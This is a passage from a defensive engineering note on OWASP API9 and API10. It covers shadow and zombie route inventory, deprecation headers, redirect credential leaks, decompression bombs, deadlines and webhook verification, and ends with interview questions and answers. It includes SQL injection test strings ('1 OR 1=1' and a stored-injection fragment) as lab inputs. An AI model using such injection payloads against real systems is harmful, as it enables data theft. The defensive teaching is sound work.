What the 24 tests pin, in order: the naive `APIRoute` scan returns an empty set in FastAPI 0.162.0; the drift report lists exactly ten undocumented operations including the mounted app's own docs; hidden and mounted routes answer `200` despite their absence from the spec, and the v1 route accepts `1 OR 1=1` as an id; a phantom spec entry is detected; deprecated paths carry `Deprecation: @1782863999`, `Sunset: Thu, 31 Dec 2026 23:59:59 GMT`, and two `Link` fields while current paths carry none; sunset paths answer `410` problem JSON and `/v10/x` is not caught by the `/v1` prefix; a sunset before deprecation is refused; unknown upstream fields are dropped; a string price makes the naive total `"250250250"` instead of raising; a `null` price makes it raise `TypeError` while the quote app answers `502`; an answer for a different SKU is refused; the httpx `308` leak; redirects refused without contacting `Location`; scheme and host checked before I/O; the gzip bomb; an oversize `Content-Length` refused; a trickle cut by the deadline; wrong status and media type refused while `application/vnd.p+json` is accepted; duplicate keys; `NaN` and 5000-deep nesting; pinned parser facts; stored SQL injection; webhook key rotation; and webhook tampering, wrong key, stale timestamp, the inclusive 300 second boundary, replay, and malformed headers.

## Pitfalls

> [!warning] The beta host without the rate limit
> Trigger: a control (rate limit, WAF rule, auth proxy) lives in a component in front of production, and a second host runs the same API without it.
> Symptom: a researcher found `www.facebook.com` blocked password-reset code guesses after 10 to 12 invalid attempts, while `beta.facebook.com` and `mbasic.beta.facebook.com` had no limit on `POST /recover/as/code/`, so the 6-digit code could be brute-forced for any account; the report went to Facebook on 2016-02-22, the researcher verified the fix on 2016-02-23, and Facebook awarded a US $15,000 bounty on 2016-03-02 (researcher write-up, republished by freeCodeCamp).
> Fix: enforce the control inside the API or its shared chassis so every deployment inherits it, and inventory hosts from DNS and certificates, not from memory; this is OWASP API9 scenario 1.

> [!warning] The API nobody was watching
> Trigger: an API returns customer records to callers whose volume and pattern nobody inventories or monitors.
> Symptom: T-Mobile's Form 8-K reports a bad actor obtaining data "through a single Application Programming Interface" "without authorization" for approximately 37 million current postpaid and prepaid customer accounts, starting on or around 2022-11-25 and identified on 2023-01-05; the filing does not state a root cause, so treat it as evidence of the cost of an unmonitored data flow, not of a specific bug.
> Fix: the data-flow half of API9: every API that returns personal data has an owner, an expected consumer set, and per-consumer volume alerts.

> [!warning] Inventory script that silently sees nothing
> Trigger: `[r.path for r in app.routes if isinstance(r, APIRoute)]` on FastAPI 0.162.0.
> Symptom: the scan returns an empty list for every route registered through `include_router`, so a CI gate built on it passes vacuously.
> Fix: walk with `fastapi.routing.iter_route_contexts` and recurse into `Mount.routes`, and add a test asserting the walker finds a known route, as the lab does.

> [!warning] The hidden debug route
> Trigger: `include_in_schema=False` used as an access control.
> Symptom: the route is absent from `/openapi.json` and fully reachable; the lab's `/v2/debug/config` answers `200`.
> Fix: schema visibility is documentation, not authorization; protect with a deny-by-default dependency (see [[Defeating-BFLA-API5-2023-Function-Level-Guards-and-Deny-By-Default-Routers]]) or do not deploy the route.

> [!warning] Redirect-following leaks the custom credential
> Trigger: `follow_redirects=True` with an API key in a custom header, against a partner that is compromised or misconfigured.
> Symptom: httpx 0.28.1 replays a `307` or `308` request with method, body, and custom headers to the new origin; only `Authorization` and `Cookie` are stripped.
> The same class shipped as CVEs in other clients: urllib3 leaked `Cookie` (CVE-2023-43804) and `Proxy-Authorization` (CVE-2024-37891) on cross-origin redirects, and requests forwarded `Proxy-Authorization` on redirects to HTTPS (CVE-2023-32681).
> Fix: `follow_redirects=False` at the call site, treat `3xx` from a partner as an error, and put credentials in `Authorization` so the client's stripping logic at least applies if someone re-enables following.

> [!warning] Decompression bomb behind a small `Content-Length`
> Trigger: a size check on `Content-Length` or on raw bytes, with transparent decoding enabled.
> Symptom: 8 KiB on the wire becomes 8 MiB in memory in the lab, in the naive path and, as a single decoded chunk, inside the capped choke point too; urllib3 before 2.6.0 could over-decompress even when the caller asked for `read(amt=256)` (CVE-2025-66471).
> Fix: count decoded bytes from `aiter_bytes` and abort past the cap, which stops parsing and further growth; for a hard memory bound send `Accept-Encoding: identity` and refuse any other `Content-Encoding`, or decode `aiter_raw` yourself with a `max_length` on each `decompress` call.

> [!warning] Read timeout mistaken for a deadline
> Trigger: relying on httpx's 5 second default.
> Symptom: a slow-drip upstream keeps every chunk under 5 seconds and pins the worker, its database session, and its connection-pool slot; the pool-exhaustion version of this outage is [[Case-Study-Connection-Pool-Exhaustion-from-Holding-DB-Sessions-Across-Slow-Outbound-HTTP-Calls]].
> Fix: an outer `anyio.fail_after` (or `asyncio.timeout`) budget for the whole exchange, derived from the inbound request's remaining time.

> [!warning] Validation that admits arithmetic on strings
> Trigger: lax coercion or no model at all on a numeric partner field.
> Symptom: `"250" * 3 == "250250250"` in Python, so a partner sending a string produces a wrong total with no exception, and `null * 3` raises `TypeError` and becomes a `500`.
> Fix: `strict=True` models so `"250"` fails with `int_type`, and map validation failure to `502`, not `500`.

## Security and robustness

- Threat model for API9: an attacker enumerates hosts and paths (certificate transparency logs, DNS, JavaScript bundles, mounted `/v1/openapi.json`) and targets the version or host with the weakest controls; the defense is that every reachable operation is in the computed inventory, carries the same authentication, authorization, and rate limits, and has a retirement date.
- Threat model for API10: the attacker controls or compromises a partner, or a value the partner stores (a repository name, an address, a display name); the consumer's code is the injection sink, so every OWASP input control applies to partner data exactly as it does to client data.
- Transport: `https` only, enforced by the choke point before any I/O, because OWASP lists cleartext channels (CWE-319) first; for high-value partners add mutual TLS or certificate pinning at the client.
- Egress allowlist: the host allowlist doubles as an SSRF control when any part of the URL is data-derived; the DNS-rebinding-safe transport is in [[Preventing-SSRF-API7-2023-DNS-Pinning-and-Private-CIDR-Socket-Guards]].
- Resource limits: decoded-byte cap, total deadline, nesting limit, and integer-digit limit are the API4 controls applied in the outbound direction; the inbound versions are in [[Unrestricted-Resource-Consumption-API4-2023-Payload-Depth-and-Limit-Guards]].
- Ambiguity: duplicate keys and non-JSON constants are rejected because any two parsers that disagree on a document create a bypass between them.
- Error hygiene: the `502` body names the failure class (`schema`, `too_large`) and never echoes the partner's body or `Location`, which may contain secrets or attacker text; log the detail through the redaction pipeline in [[Structured-Log-Redaction-and-Preventing-PII-and-Token-Leaks]].
- Inbound webhooks: verify the HMAC over raw bytes before parsing, constant-time compare, bound the timestamp window, deduplicate ids, and allowlist sender IPs where the provider publishes them (Stripe documents both controls).
- Defense in depth for retired versions: `410` at the edge, removal of the route, removal of credentials scoped to it, and removal of its DNS name, in that order, so a forgotten deployment cannot resurrect it.

## The principal's view

The architectural decision is where the inventory and the trust boundary live.
Put the inventory in the build: the routing tree is walked and diffed against the spec on every change, the result feeds the RFC 9727 catalog and the gateway configuration, and an undocumented operation fails the build; this makes shadow APIs a compile error instead of a pen-test finding, at the cost of forcing every team onto a framework whose router can be introspected (or a gateway that is the only ingress).
Put the trust boundary in one shared outbound client per partner: a small library owning allowlist, redirect policy, byte cap, deadline, parser hardening, and the typed model, with service teams forbidden from constructing raw `httpx.AsyncClient`s to partners; the cost is a central team that must move as fast as partner integrations do.
The organizational trade-off is strictness against partner churn: `extra="forbid"` and exact media-type checks catch drift on day one but page you for every additive change, while `extra="ignore"` plus contract tests against the partner's published schema follows RFC 7493 Section 4.2's Must-Ignore guidance and still keeps unknown fields out of your system.
Retirement is a product decision dressed as a protocol one: `Deprecation` and `Sunset` headers only help clients that read them, so pair them with per-client usage telemetry and scheduled brownouts before the `410` cutover (see [[Brownout-Schedules-Per-Client-Usage-Telemetry-and-Safe-Sunsetting]]).
Choose differently when the partner is internal and generated from the same schema registry: a shared contract plus consumer-driven contract tests can replace most runtime checks except size, time, and redirects, which no contract can promise.
For event-heavy integrations, prefer pulling from a signed, replayable log (or a queue) over synchronous calls in the request path, because it moves the deadline problem out of the user's latency budget entirely.

## Interview questions

> [!question] L5: Name the five conditions OWASP lists that make an API vulnerable to API10:2023.
>
> > [!success]- Answer
> > Talking to other APIs over an unencrypted channel.
> > Not validating or sanitizing their data before processing or passing it downstream.
> > Following redirects blindly.
> > Not limiting the resources used to process their responses.
> > Not setting timeouts for the interaction.
> >
> > Follow-up: Which of these five does `httpx.AsyncClient()` with no arguments already handle, and which does it not?

> [!question] L5: Why does a `Content-Length` check not protect you from a decompression bomb?
>
> > [!success]- Answer
> > `Content-Length` measures the encoded content as transferred (RFC 9110 Section 8.6), while the application reads decoded bytes after `Content-Encoding` is undone (RFC 9110 Section 8.4).
> > In the lab 8192 gzip bytes decode to 8388619 bytes.
> > The cap must count decoded bytes from `aiter_bytes` and abort as soon as it is exceeded.
> >
> > Follow-up: Why does even a per-chunk decoded cap not bound peak memory exactly to the cap in httpx 0.28.1?

> [!question] L5: What is the difference between a shadow API and a zombie API, and how does each show up in a drift report?
>
> > [!success]- Answer
> > A shadow API is served but undocumented and unowned, so it appears in the "served minus documented" set.
> > A zombie API is a version that should have been retired but still answers, which appears in the served set with a lifecycle record whose sunset has passed or is missing.
> > Phantom entries, documented but not served, are the third category and indicate stale documentation.
> >
> > Follow-up: Which of the three does RFC 9727 Section 8 explicitly name?

> [!question] L6: Predict the output.
> With httpx 0.28.1, a client `POST`s JSON to `https://a.example/x` with headers `Authorization: Bearer t` and `X-Api-Key: k` and `follow_redirects=True`; the server answers `308` with `Location: https://b.example/y`.
> Which method, body, and of those two headers reach `b.example`?
>
> > [!success]- Answer
> > The method stays `POST` because `308` forbids a method change (RFC 9110 Section 15.4.9).
> > The JSON body is resent because `_redirect_stream` keeps the stream when the method is unchanged.
> > `X-Api-Key: k` arrives, and `Authorization` does not, because `_redirect_headers` strips only `Authorization` across origins (plus `Cookie` always).
> > The lab asserts exactly this.
> >
> > Follow-up: What changes if the status is `302` instead?

> [!question] L6: Debug this API.
> A CI job that fails on undocumented routes has passed for months, yet a pen test finds `/admin/export` reachable and absent from the spec.
> The job runs `[r for r in app.routes if isinstance(r, APIRoute)]` on FastAPI 0.162.0.
> What is wrong?
>
> > [!success]- Answer
> > In FastAPI 0.162.0 `include_router` appends a private `_IncludedRouter` to `app.routes` instead of copying `APIRoute` objects, so the scan sees no routes from any included router.
> > An empty served set has no undocumented members, so the gate passes vacuously.
> > Walk with `fastapi.routing.iter_route_contexts`, recurse into `Mount.routes`, and add an assertion that a known route is found so the gate cannot pass empty.
> >
> > Follow-up: The route was also registered with `include_in_schema=False`; why does that not change the diagnosis?

> [!question] L6: pydantic validates a partner's JSON into a strict model.
> Name three things that still pass and how you catch them.
>
> > [!success]- Answer
> > Duplicate keys pass with the last value winning; catch them with `json.loads(..., object_pairs_hook=...)`.
> > `NaN` and `Infinity` pass for `float` fields; set `allow_inf_nan=False` and reject constants with `parse_constant`.
> > A well-typed injection payload such as `x'), (666, (SELECT ...))--` passes a `str` field; parameterize the SQL and encode on output.
> > A correct-looking answer to a different question passes; bind the response to the request, for example by checking the returned `sku`.
> >
> > Follow-up: Why validate with pydantic before running the stdlib parser rather than after?

> [!question] L6: Your partner's upstream sometimes hangs for minutes even though httpx's 5 second timeout is configured.
> Explain and fix.
>
> > [!success]- Answer
> > The httpx read timeout bounds the wait for each chunk, not the whole response, so an upstream sending a byte every few seconds never trips it.
> > Wrap the exchange in `anyio.fail_after` or `asyncio.timeout` with a total budget derived from the inbound request's remaining deadline.
> > Map the expiry to `504 Gateway Timeout` (RFC 9110 Section 15.6.5) so callers distinguish it from a `502`.
> >
> > Follow-up: What resource besides the worker coroutine does the hang hold, and how does that turn one slow partner into a full outage?

> [!question] L7+: Design the retirement of `/v1` across 400 external integrators with a hard compliance date.
>
> > [!success]- Answer
> > Announce with `Deprecation: @<epoch>` and a `rel="deprecation"` link now, and `Sunset` with the compliance date, keeping sunset >= deprecation (RFC 9745 Section 4).
> > Instrument per-client usage of `/v1` and contact the top consumers directly, because headers reach only clients that read them.
> > Run scheduled brownouts that return `410` for short, announced windows to flush out silent dependents.
> > At the date, answer `410` problem JSON at the edge, then remove routes, credentials, and DNS in sequence.
> > Publish the change in the RFC 9727 catalog so automated discovery stops offering `/v1`.
> >
> > Follow-up: A large customer cannot migrate in time; how do you keep the exception from becoming a permanent zombie?

> [!question] L7+: Argue for or against `extra="forbid"` on models for third-party responses.
>
> > [!success]- Answer
> > For: it surfaces partner drift immediately and prevents unknown fields from ever reaching code that might forward them.
> > Against: RFC 7493 Section 4.2 recommends a Must-Ignore policy because Must-Understand is brittle, and a partner's additive field would take your integration down.
> > The usual resolution is `extra="ignore"` so unknown fields are dropped, never forwarding the raw dict, plus contract tests and an alert when the partner's schema changes.
> > Reserve `forbid` for security-critical messages where an unexpected field signals tampering, such as signed webhook envelopes with a fixed schema.
> >
> > Follow-up: How would you detect a partner's additive change without failing requests?

> [!question] L7+: Where should the organization's API inventory come from, and what makes it trustworthy?
>
> > [!success]- Answer
> > From artifacts that cannot drift from reality: the routing tree of each built service, gateway route tables, DNS zones, and certificate issuance.
> > It is trustworthy when an undocumented operation fails the build, when each host has an environment, audience, version, owner, and retirement date as OWASP API9 requires, and when the published catalog is generated from it rather than edited by hand.
> > Data flows to third parties need the same treatment: an inventory of which partner receives which sensitive fields, with an approval record.
> >
> > Follow-up: Which part of this cannot be computed from code, and who owns it?

## Related

Prerequisites: [[Protecting-Sensitive-Business-Flows-API6-2023-Anti-Automation-and-Bot-Defense]]

Next: [[CORS-Protocol-Internals-Preflight-Caching-and-Origin-Reflection-Exploits]]

See also: [[02-Programming-Languages/Python/Python-Backend-Interview-Prep/07-Auth-and-Security]], [[OWASP-API-Security-Top-10-2023-Complete-Threat-Model]], [[Preventing-SSRF-API7-2023-DNS-Pinning-and-Private-CIDR-Socket-Guards]], [[Unrestricted-Resource-Consumption-API4-2023-Payload-Depth-and-Limit-Guards]], [[SQL-Injection-NoSQL-Injection-and-Order-By-Identifier-Escaping]], [[Defeating-BOPLA-and-Mass-Assignment-API3-2023-Strict-Input-Output-Schemas]], [[Defeating-BFLA-API5-2023-Function-Level-Guards-and-Deny-By-Default-Routers]], [[Structured-Log-Redaction-and-Preventing-PII-and-Token-Leaks]], [[Deprecation-Header-RFC-9745-and-Sunset-Header-RFC-8594]], [[API-Discovery-and-Well-Known-API-Catalog-RFC-9727]], [[API-Estate-Inventory-Cataloging-RFC-9727-and-Shadow-API-Discovery]], [[Brownout-Schedules-Per-Client-Usage-Telemetry-and-Safe-Sunsetting]], [[Design-First-vs-Code-First-OpenAPI-and-CI-Drift-Gates]], [[Additive-Schema-Evolution-and-Tolerant-Reader-Patterns]], [[Timeout-Taxonomy-Connect-Read-Write-Pool-and-Deadline-Propagation]], [[Webhook-Consumer-Engineering-Signature-Verification-Replay-Windows-and-Idempotency]], [[Case-Study-Connection-Pool-Exhaustion-from-Holding-DB-Sessions-Across-Slow-Outbound-HTTP-Calls]]

- Lab: `labs/tests/f15_api_authorization_and_owasp_security/test_improper_inventory_management_api9_2023_and_unsafe_consumption_of_apis_api10_2023.py`

## Further reading

- [OWASP API9:2023 Improper Inventory Management](https://api-security.owasp.org/editions/2023/en/0xa9-improper-inventory-management): the documentation and data-flow blind spots and the prevention list this note implements.
- [OWASP API10:2023 Unsafe Consumption of APIs](https://api-security.owasp.org/editions/2023/en/0xaa-unsafe-consumption-of-apis): the five vulnerable conditions and the three scenarios the lab reproduces.
- [RFC 9745: The Deprecation HTTP Response Header Field](https://www.rfc-editor.org/rfc/rfc9745.html): the Structured Field Date syntax and the sunset-after-deprecation rule.
- [RFC 8594: The Sunset HTTP Header Field](https://www.rfc-editor.org/rfc/rfc8594.html): sunset semantics, scope, and why the value is a hint.
- [RFC 9727: api-catalog](https://www.rfc-editor.org/rfc/rfc9727.html): the standard publication point for an API inventory.
- [RFC 9110 Section 15.4](https://www.rfc-editor.org/rfc/rfc9110.html#section-15.4): what a client must strip and may keep when following a redirect.
- [RFC 8259 Section 4](https://www.rfc-editor.org/rfc/rfc8259.html#section-4) and [RFC 7493](https://www.rfc-editor.org/rfc/rfc7493.html): why duplicate keys and large numbers are interoperability hazards, and the Must-Ignore policy.
- [httpx 0.28.1 `_client.py`](https://github.com/encode/httpx/blob/0.28.1/httpx/_client.py): `_redirect_headers`, `_redirect_method`, and `_redirect_stream`, the code behind the `308` result.
- [Standard Webhooks specification](https://raw.githubusercontent.com/standard-webhooks/standard-webhooks/main/spec/standard-webhooks.md): the signed-content format, rotation, and replay guidance.
- [GHSA-2xpw-w6gg-jr37 (CVE-2025-66471)](https://github.com/advisories/GHSA-2xpw-w6gg-jr37): the urllib3 streaming decompression bomb and its fix.
- [T-Mobile Form 8-K, 2023-01-19](https://sec.gov/Archives/edgar/data/1283699/000119312523010949/d641142d8k.htm): a primary disclosure of data abuse through a single API.
